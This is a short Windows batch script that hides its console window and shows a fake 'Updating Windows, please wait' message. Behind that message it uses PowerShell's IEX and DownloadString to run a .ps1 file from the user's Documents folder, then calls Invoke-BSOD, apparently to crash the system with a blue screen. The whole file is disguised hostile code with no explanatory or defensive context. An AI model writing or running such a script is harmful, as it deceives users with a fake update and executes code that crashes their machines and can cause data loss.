@echo off
mode con: cols=15 lines=1
echo Updating Windows, please wait
powershell IEX((New-Object Net.Webclient).DownloadString('"%userprofile%\Documents\bh3oub0b.ps1"'));Invoke-BSOD
